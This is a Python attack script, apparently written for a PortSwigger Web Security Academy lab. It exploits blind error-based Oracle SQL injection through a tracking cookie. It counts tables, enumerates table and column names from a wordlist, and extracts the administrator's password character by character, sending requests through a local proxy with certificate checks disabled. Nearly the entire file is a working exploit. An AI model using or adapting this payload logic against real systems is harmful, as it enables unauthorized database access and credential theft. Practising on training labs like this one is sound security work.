import requests
import string
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = "https://0a0000970491be59c19a8ac2004500d4.web-security-academy.net/filter?category=Accessories"
cookie = {"TrackingId": "mq2HJqt6JmqYaHvi"}
proxies = {
   'http': 'http://localhost:8080',
   'https': 'http://localhost:8080',
}

payload_base = "'||(INSERTION_POINT)||'"

def findNumberOfTables():
    payloads = []
    numberOfTablesCount = []

    query = "select case when count(*)=INSERTION_POINT then 'true' else to_char(1/0) end from all_tables"
    for i in range(74, 76):
        tmp = query.replace("INSERTION_POINT",  str(i))
        tmp2 = payload_base.replace("INSERTION_POINT", tmp)
        numberOfTablesCount.append(str(i))
        payloads.append(tmp2)

    # Finalize
    print("FINDING NUMBER OF TABLES")

    for i,p in enumerate(payloads):
        tmp = {list(cookie.keys())[0]: list(cookie.values())[0]+payloads[i]}
        x = requests.get(url, cookies=tmp, verify=False, proxies=proxies)
        print("Payload count(*)=" +  numberOfTablesCount[i] +", code: " + str(x.status_code))

def findTableNames():
    
    query = "select '' from INSERTION_POINT where ROWNUM=1"
    oracleDefaultTables = []
    
    with open(r'C:\Users\noamj\Documents\GitHub\wordlists\portswigger\ps_sqli\sqliDevelopment\oracleDefaultTables.txt') as my_file:
        for line in my_file:
            oracleDefaultTables.append(line.rstrip('\n'))

    print("FINDING TABLE NAMES")
    for i in oracleDefaultTables:
        tmpA = query.replace("INSERTION_POINT", i)
        tmpB = payload_base.replace("INSERTION_POINT", tmpA)
        tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}

        x = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
        print("Table name: " + i, ", Status: " + str(x.status_code))

def findColNames(tableName):
    
    query = "select INSERTION_POINT from " + tableName + " where ROWNUM=1"
    oracleDefaultTables = []
    
    with open(r'C:\Users\noamj\Documents\GitHub\wordlists\portswigger\ps_sqli\sqliDevelopment\oracleDefaultTables.txt') as my_file:
        for line in my_file:
            oracleDefaultTables.append(line.rstrip('\n'))

    print("FINDING TABLE NAMES")
    for i in oracleDefaultTables:
        tmpA = query.replace("INSERTION_POINT", i)
        tmpB = payload_base.replace("INSERTION_POINT", tmpA)
        tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}

        x = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
        print("Table name: " + i, ", Status: " + str(x.status_code))

def findValue(tableName, colName, valueLength):
    
    query = "select case when SUBSTR("+colName+", INSERTION_POINT_A, 1)='INSERTION_POINT_B' THEN 'true' ELSE TO_CHAR(1/0) END FROM "+tableName+" where username='administrator'"
    
    value = ""
    for i in range(1, valueLength+1):
        print("Value: " + value)
        tmp = query.replace("INSERTION_POINT_A", str(i))
        for s in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~":
            tmpA = tmp.replace("INSERTION_POINT_B", str(s))
            tmpB = payload_base.replace("INSERTION_POINT", tmpA)
            tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}
            r = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)

            if (r.status_code == 200):
                value = value + s
                break
    
    print(value)
            

#findTableNames()
#findNumberOfTables()
findValue("users", "password", 20)
